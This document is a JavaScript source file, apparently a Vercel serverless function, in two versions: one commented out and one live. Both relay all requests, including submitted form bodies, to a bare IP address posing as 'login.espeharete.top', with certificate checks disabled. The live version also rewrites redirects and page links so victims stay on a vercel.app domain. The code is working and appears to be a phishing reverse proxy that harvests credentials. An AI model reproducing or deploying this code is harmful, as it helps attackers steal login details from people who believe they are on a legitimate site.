// import https from 'https';

// export default async function handler(req, res) {
//   const targetUrl = `https://185.165.171.174${req.url}`;

//   // Proper headers with fallback for X-Real-IP
//   const headers = {
//     'Host': 'login.espeharete.top',
//     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
//     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
//     'Accept-Language': 'en-US,en;q=0.9',
//     'Accept-Encoding': 'gzip, deflate, br',
//     'Connection': 'keep-alive',
//     'Upgrade-Insecure-Requests': '1',
//     'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
//     'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1' // Fallback value
//   };

//   // Remove potentially problematic headers
//   delete headers['content-length'];
//   delete headers['transfer-encoding'];

//   const options = {
//     hostname: '185.165.171.174',
//     port: 443,
//     path: req.url,
//     method: req.method,
//     headers: headers,
//     rejectUnauthorized: false,
//     timeout: 15000 // Increased timeout to 15 seconds
//   };

//   return new Promise((resolve) => {
//     const proxyReq = https.request(options, (proxyRes) => {
//       // Filter response headers
//       const responseHeaders = { ...proxyRes.headers };
//       delete responseHeaders['content-length'];
//       delete responseHeaders['transfer-encoding'];
      
//       res.writeHead(proxyRes.statusCode || 200, responseHeaders);
//       proxyRes.pipe(res);
      
//       proxyRes.on('end', () => resolve());
//     });

//     proxyReq.on('error', (err) => {
//       console.error('Proxy request error:', err);
//       if (!res.headersSent) {
//         res.status(502).json({ 
//           error: 'Bad Gateway',
//           message: err.message,
//           code: err.code
//         });
//       }
//       resolve();
//     });

//     proxyReq.on('timeout', () => {
//       console.error('Proxy request timeout');
//       proxyReq.destroy();
//       if (!res.headersSent) {
//         res.status(504).json({ error: 'Gateway Timeout' });
//       }
//       resolve();
//     });

//     // Forward request body if present
//     if (req.method === 'POST' || req.method === 'PUT') {
//       req.pipe(proxyReq);
//     } else {
//       proxyReq.end();
//     }
//   });
// }



import https from 'https';

export default async function handler(req, res) {
  const targetUrl = `https://185.165.171.174${req.url}`;

  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1'
  };

  const options = {
    hostname: '185.165.171.174',
    port: 443,
    path: req.url,
    method: req.method,
    headers,
    rejectUnauthorized: false,
    timeout: 15000
  };

  return new Promise((resolve) => {
    const proxyReq = https.request(options, (proxyRes) => {
      let body = [];

      proxyRes.on('data', (chunk) => body.push(chunk));
      proxyRes.on('end', () => {
        const buffer = Buffer.concat(body);
        let content = buffer.toString();

        // Intercept redirect Location header
        if (
          proxyRes.statusCode >= 300 &&
          proxyRes.statusCode < 400 &&
          proxyRes.headers.location
        ) {
          // Rewrite redirect to stay on vercel.app
          const rewritten = proxyRes.headers.location.replace(
            /https?:\/\/login\.espeharete\.top/gi,
            'https://aa-iido.vercel.app'
          );

          res.writeHead(proxyRes.statusCode, {
            ...proxyRes.headers,
            location: rewritten
          });
          res.end();
          return resolve();
        }

        // Optionally, rewrite HTML content to keep URLs pointing through Vercel
        if (
          proxyRes.headers['content-type'] &&
          proxyRes.headers['content-type'].includes('text/html')
        ) {
          content = content.replace(
            /https?:\/\/login\.espeharete\.top/gi,
            'https://aa-iido.vercel.app'
          );
        }

        res.writeHead(proxyRes.statusCode, {
          ...proxyRes.headers,
          'content-length': Buffer.byteLength(content)
        });
        res.end(content);
        return resolve();
      });
    });

    proxyReq.on('error', (err) => {
      res.status(502).json({ error: 'Bad Gateway', message: err.message });
      return resolve();
    });

    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      res.status(504).json({ error: 'Gateway Timeout' });
      return resolve();
    });

    if (req.method === 'POST' || req.method === 'PUT') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
